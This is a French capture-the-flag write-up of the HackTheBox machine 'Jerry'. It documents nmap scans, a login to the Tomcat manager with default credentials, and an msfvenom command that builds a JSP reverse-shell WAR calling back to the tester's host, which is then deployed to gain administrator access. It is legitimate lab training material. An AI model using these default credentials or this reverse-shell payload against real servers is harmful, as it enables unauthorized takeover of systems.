---
tags:
  - htb
  - web
  - tomcat
  - msfvenom
title: Jerry
os: Windows
difficulty: Easy
date: 2025-11-15
status: terminé
draft: "false"
---
---
# Jerry

> [!summary] Résumé rapide  
> Jerry est une machine Facile de HackTheBox. Elle présente un service Tomcat avec un accès peu protégé à la console de management web. Ceci permet d'uploader un fichier .WAR malveillant qui permet à un attaquant d'obtenir un accès privilégié au serveur.

---

## 🟦 Informations générales

- **Nom de la machine :** Jerry
- **OS :** Windows
- **Difficulty :** Easy
- **Auteur :** mrh4sh
- **Date :** 15/11/2025
- **Statut :** Terminée

---
## 🟦 1. Reconnaissance réseau


> [!info] 1.2 Nmap – Scan initial

```bash
nmap -p- 10.129.57.155 --min-rate 5000
```

**Services découverts :**

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 19:12 CET
Nmap scan report for 10.129.57.155
Host is up (0.12s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 26.68 seconds
```

> [!info] 1.3 Nmap – Scan complet

```bash
nmap -sVC -p8080 10.129.57.155 -oN jerry.nmap
```

**Infos supplémentaires :**

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 19:13 CET
Nmap scan report for 10.129.57.155
Host is up (0.017s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.92 seconds
```

---
## 🟦 2. Analyse des services

### 🌐 HTTP / Web

Le site semble être une installation par défaut d'Apache Tomcat/7.0.88 :
![[Pasted image 20251115191801.png]]

**Technos détectées :**  
-  Serveur Apache Tomcat/Coyote JSP engine 1.1
-  Apache Tomcat en version 7.0.88

Via la console d'admin on voit aussi :
-  JVM en version 1.8.0
-  OS Windows Server 2012 R2 (ver. 6.3)

**Endpoints trouvés :**
L'url /manager/html est protégé par un mot de passe : les identifiants `tomcat:s3cret` permettent d'y accéder.

**Hypothèses :** 
-  On serait face à un serveur avec une config par défaut et donc il est peut-être possible d'exploiter des failles de sécurités dans cette version de Tomcat
-  Avec notre accès, on peut uploader un fichier .war malveillant pour accéder au serveur

---

## 🟦 3. Points d’entrée potentiels

-  La version d'Apache Tomcat semble vulnérable à une attaque qui permet à un attaquant d'exécuter du code à distance : [CVE-2019-0232](https://www.cvedetails.com/cve/CVE-2019-0232/)
-  Envoi d'un fichier .war malveillant

---

## 🟦 4. Exploitation

> [!tip] 4.1 PoC

Si on utilise `msfconsole` pour essayer l'exploit `windows/http/tomcat_cgi_cmdlineargs` (CVE-2019-0232), on obtient aucun résultat.

On peut donc tenter l'approche du fichier WAR malveillant ([source](https://ruuand.github.io/Apache_Tomcat/)) :
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.66 LPORT=1337 -f war > shell.war
```

Sur le manager, on upload le fichier shell.war et on clique sur deploy :

![[Pasted image 20251115200249.png]]

Le shell a été uploadé :
![[Pasted image 20251115200346.png]]

On ouvre une session netcat en local :
```bash
nc -lnvp 1337
```

Puis on ouvre l'url http://jerry.htb:8080/shell

**Résultat :**  
![[Pasted image 20251115200513.png]]

**Accès obtenu :**  
- User :  administrator
- Contexte :  shell

---

## 🟦 7. Résumé final

> [!success] Ce que j’ai appris  
-  Usage de `msfvenom` pour la création de payload
-  Découverte Apache Tomcat et des .war

> [!failure] Ce que j’ai raté / À éviter  
-  Attention de bien s'assurer qu'un CVE soit exploitable avant de passer trop de temps à l'essayer

> [!attention] Patterns utiles  
-  Recherche de mots de passe par défaut sur le net ou dans l'application
-  Upload de fichiers malveillants